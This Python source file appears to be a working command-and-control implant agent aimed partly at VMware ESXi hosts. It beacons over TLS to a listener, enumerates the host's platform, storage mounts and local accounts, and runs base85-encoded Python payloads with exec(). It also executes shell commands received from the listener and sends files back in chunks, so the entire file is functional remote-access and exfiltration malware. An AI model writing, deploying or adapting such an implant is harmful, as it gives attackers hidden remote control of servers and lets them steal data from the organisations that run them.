import os
import sys
import ssl
import json
import time
import socket
import base64
import hashlib
import logging
import platform
import datetime
import subprocess
from random import randrange


_LISTENER_HOST = "localhost"
_LISTENER_PORT = 1235
_LISTENER_SECRET = "whatever"
_AGENT_BEACON_INTERVAL = 0.1
_AGENT_BEACON_JITTER = 2
_AGENT_START_TIME = datetime.time(0, 0, 0)
_AGENT_END_TIME = datetime.time(23, 59, 0)
_AGENT_SOCKET_TIMEOUT = 2
_AGENT_LOGLEVEL = logging.DEBUG
_AGENT_PID_FILE_LOCATION = "/tmp/agent.pid"
_AGENT_FILE_TRANSFER_BLOCK_SIZE = 8192


logging.basicConfig(level=_AGENT_LOGLEVEL, format="%(asctime)s %(message)s")


class Agent:
    def __init__(self):
        self.ssock = None
        self.uuid = self.get_uuid()
        self.enumdata = None

    def init_socket(self):
        context = ssl.create_default_context()
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        _AGENT_CIPHERS = "AES128-SHA"
        context.set_ciphers(_AGENT_CIPHERS)
        logging.debug("Connecting socket")
        try:
            sock = socket.create_connection((_LISTENER_HOST, _LISTENER_PORT))
            sock.settimeout(_AGENT_SOCKET_TIMEOUT)
            logging.debug("Upgrading to TLS")
            self.ssock = context.wrap_socket(sock, server_hostname=_LISTENER_HOST)
            return True
        except:
            return False

    def enum_host(self):
        logging.debug("Enumerating host")
        host_platform = platform.platform()
        host_name = socket.gethostname()
        host_data = {"host_platform": host_platform, "host_name": host_name}

        enumdata = {
            "host_data": host_data,
            "agent_max_beacon_interval": _AGENT_BEACON_INTERVAL + _AGENT_BEACON_JITTER,
            "agent_active_hr_start": str(_AGENT_START_TIME),
            "agent_active_hr_end": str(_AGENT_END_TIME),
        }

        if "VMkernel" in host_platform:
            logging.debug("Beginning platform-specific ESXi enumeration")

            logging.debug("Enumerating mounts")
            host_mounts = {}
            m_fs_mounts = os.popen("esxcli storage filesystem list | grep ^/").read()
            for entry in m_fs_mounts.splitlines():
                entry = entry.split()
                m_mountpoint = entry[0]
                m_handle = entry[1]
                m_uuid = entry[2]
                m_type = entry[4]
                m_size = entry[5]
                m_free = entry[6]
                host_mounts[m_uuid] = {
                    "mountpoint": m_mountpoint,
                    "name": m_handle,
                    "type": m_type,
                    "size": m_size,
                    "free": m_free,
                }
            host_data["host_mounts"] = host_mounts

            logging.debug("Enumerating local users")
            host_local_users = {}
            l_users = os.popen("esxcli system account list").read()
            for entry in l_users.splitlines()[2:]:
                entry = entry.split()
                u_name = entry[0]
                u_desc = entry[1]
                host_local_users[u_name] = {"description": u_desc}
            host_data["host_local_users"] = host_local_users

        logging.debug(enumdata)
        return enumdata

    def get_uuid(self):
        """
        Method to generate UUID from host parameters for
        agent persistence.
        """
        logging.debug("Generating UUID")
        uuid_components = [socket.gethostname()]
        agent_uuid = hashlib.sha224("".join(uuid_components).encode()).hexdigest()[0:4]
        logging.debug(agent_uuid)
        return agent_uuid

    def tls_transact_msg(self, msg):
        """
        Method to allow the client to send a message to
        the listener using TLS.
        """
        logging.debug("Preparing to send packet")

        try:
            logging.debug("Sending packet")
            logging.debug("AGENT    : " + msg[0:25])
            self.ssock.send(msg.encode())
            response = self.ssock.recv()
            logging.debug("LISTENER : " + response.decode())
            if response.decode() == "":
                response = False
        except Exception as e:
            logging.error(e)

            response = False
        return response

    def associate(self):
        """
        Association method. Creates the following packet structure:
        Association:
            _associate{ secret:"mysecret", uuid:"myuuid" }
        """
        logging.debug("Associating agent")
        associate_packet_stub = {
            "secret": _LISTENER_SECRET,
            "uuid": self.uuid,
            "enumdata": self.enumdata,
        }
        associate_pkt = "_associate" + json.dumps(associate_packet_stub)
        return self.tls_transact_msg(associate_pkt)

    def beacon(self):
        """
        Beacon method. Creates the following packet structure:
        Beacon:
            _beacon{ secret:"mysecret", uuid:"myuuid" }
        """
        logging.debug("Beaconing listener")
        beacon_packet_stub = {"secret": _LISTENER_SECRET, "uuid": self.uuid}
        beacon_pkt = "_beacon" + json.dumps(beacon_packet_stub)
        return self.tls_transact_msg(beacon_pkt)

    def send_file_segment(self, data, offset, file):
        logging.debug("Sending file segment")
        response_packet_stub = {
            "secret": _LISTENER_SECRET,
            "uuid": self.uuid,
            "status": "FILE_TRANSFER",
            "data": data,
            "offset": offset,
            "filename": file,
        }
        response_pkt = "_response" + json.dumps(response_packet_stub)
        return self.tls_transact_msg(response_pkt)

    def send_file(self, filename):
        offset = 0
        try:
            file = open(filename, "rb")
        except FileNotFoundError:
            self.respond_error("File not found!")
            return
        while True:
            chunk_data = file.read(_AGENT_FILE_TRANSFER_BLOCK_SIZE)
            if not chunk_data:
                break
            chunk_data = base64.b85encode(chunk_data).decode()
            self.send_file_segment(chunk_data, offset, os.path.basename(filename))
            offset = offset + _AGENT_FILE_TRANSFER_BLOCK_SIZE

    def respond(self, msg):
        """
        Respond method. Creates the following packet structure:
        Response:
            _response{ secret:"mysecret", uuid:"myuuid", data:"cmd_response" }
        """
        logging.debug("Responding to listener")
        response_packet_stub = {
            "secret": _LISTENER_SECRET,
            "uuid": self.uuid,
            "status": "OK",
            "data": msg,
        }
        response_pkt = "_response" + json.dumps(response_packet_stub)
        return self.tls_transact_msg(response_pkt)

    def respond_error(self, msg):
        """
        Respond method. Creates the following packet structure:
        Response:
            _response{ secret:"mysecret", uuid:"myuuid", data:"cmd_response" }
        """
        logging.debug("Responding to listener")
        response_packet_stub = {
            "secret": _LISTENER_SECRET,
            "uuid": self.uuid,
            "status": "AGENT_ERROR",
            "data": msg,
        }
        response_pkt = "_response" + json.dumps(response_packet_stub)
        return self.tls_transact_msg(response_pkt)

    def run_payload(self, payload):
        logging.debug("Running a payload")
        logging.debug("========== Payload ==========")
        script = base64.b85decode(payload).decode().lstrip()
        logging.debug(script)
        try:
            exec(script)
        except Exception as e:
            error_pkt = {"status": "PAYLOAD_ERROR", "error": str(e)}
            self.respond(error_pkt)

    def run_command(self, command):
        logging.debug("Running a command")
        command = base64.b85decode(command).decode()
        logging.debug("Command: " + command)
        sp = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        sp_ret = sp.stdout.read()
        self.respond(sp_ret.decode())

    def write_pid_file(self):
        my_pid = str(os.getpid())
        pidfile = open(_AGENT_PID_FILE_LOCATION, "w")
        pidfile.write(my_pid)
        pidfile.close()

    def is_running(self):
        if not os.path.exists(_AGENT_PID_FILE_LOCATION):
            return False
        pidfile = open(_AGENT_PID_FILE_LOCATION, "r")
        pid = pidfile.read()
        logging.debug("PID file found with PID: " + pid)
        logging.debug("Checking if stale")
        try:
            os.kill(int(pid), 0)
            logging.debug("PID is still active!")
            return True
        except OSError:
            return False

    def run(self):
        self.enumdata = self.enum_host()
        _AGENT_STATE_ENUM = 0
        while True:
            time.sleep(_AGENT_BEACON_INTERVAL + randrange(_AGENT_BEACON_JITTER))
            if _AGENT_START_TIME <= datetime.datetime.now().time() <= _AGENT_END_TIME:
                if _AGENT_STATE_ENUM == 0:
                    if self.init_socket():
                        _AGENT_STATE_ENUM = 1
                if _AGENT_STATE_ENUM == 1:
                    if self.associate():
                        _AGENT_STATE_ENUM = 2
                if _AGENT_STATE_ENUM == 2:
                    beacon_response = self.beacon()
                    if beacon_response is False:
                        _AGENT_STATE_ENUM = 0
                        pass
                    else:
                        cmd = json.loads(beacon_response[9:])
                        if cmd["payload"]:
                            self.run_payload(cmd["payload"])
                        if cmd["command"]:
                            self.run_command(cmd["command"])


if __name__ == "__main__":
    logging.debug("Starting agent")
    agent = Agent()
    logging.debug("Checking PID file")
    if agent.is_running():
        logging.debug("Exiting")
        sys.exit(0)
    else:
        logging.debug("Launching agent")
        agent.write_pid_file()
        agent.run()
